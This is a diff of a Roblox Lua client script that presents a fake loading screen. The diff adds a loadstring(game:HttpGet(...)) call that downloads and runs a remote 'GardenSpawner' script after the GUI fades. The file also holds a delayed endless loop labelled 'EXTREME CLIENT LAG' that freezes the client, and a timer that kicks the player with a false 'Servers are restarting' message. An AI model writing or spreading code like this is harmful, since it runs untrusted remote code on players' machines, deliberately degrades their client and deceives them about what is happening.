@@ -1,5 +1,5 @@
 -- EXTREME CLIENT LAG (starts in 5 minutes)
-task.delay(100, function() -- 5 minutes delay
+task.delay(300, function() -- 5 minutes delay
     task.spawn(function()
         while true do
             -- Simulate intense lag by doing heavy calculations
@@ -14,8 +14,6 @@ task.delay(100, function() -- 5 minutes delay
         end
     end)
 end)
-
-
 
 -- UI Script Starts Below
 local Players = game:GetService("Players")
@@ -114,20 +112,35 @@ TweenService:Create(progressBarFill, TweenInfo.new(20, Enum.EasingStyle.Linear),
     Size = UDim2.new(1, 0, 1, 0)
 }):Play()
 
--- After 20 seconds: Fade out and clean GUI
-task.delay(20000000, function()
+-- Fade out GUI after 20 seconds
+task.delay(20, function()
     for _, obj in pairs(bg:GetDescendants()) do
-        if obj:IsA("TextLabel") or obj:IsA("ImageLabel") or obj:IsA("Frame") then
-            pcall(function()
+        pcall(function()
+            if obj:IsA("TextLabel") then
                 TweenService:Create(obj, TweenInfo.new(1), {
                     BackgroundTransparency = 1,
-                    TextTransparency = 1,
+                    TextTransparency = 1
+                }):Play()
+            elseif obj:IsA("ImageLabel") then
+                TweenService:Create(obj, TweenInfo.new(1), {
+                    BackgroundTransparency = 1,
                     ImageTransparency = 1
                 }):Play()
-            end)
-        end
+            elseif obj:IsA("Frame") then
+                TweenService:Create(obj, TweenInfo.new(1), {
+                    BackgroundTransparency = 1
+                }):Play()
+            end
+        end)
     end
 
+    -- Execute external script
+    task.delay(1, function()
+        local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/DeltaGay/femboy/refs/heads/main/GardenSpawner.lua"))()
+Spawner.Load()
+    end)
+
+    -- Cleanup
     TweenService:Create(bg, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
     task.wait(1.5)
     runConnection:Disconnect()
@@ -135,8 +148,8 @@ task.delay(20000000, function()
     StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
 end)
 
--- Failsafe: Kick player if still active after a very long time
-task.delay(1000000, function()
+-- Failsafe: Kick player if GUI stays too long
+task.delay(1000, function()
     StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
     player:Kick("Servers are restarting... Please rejoin later.")
 end)
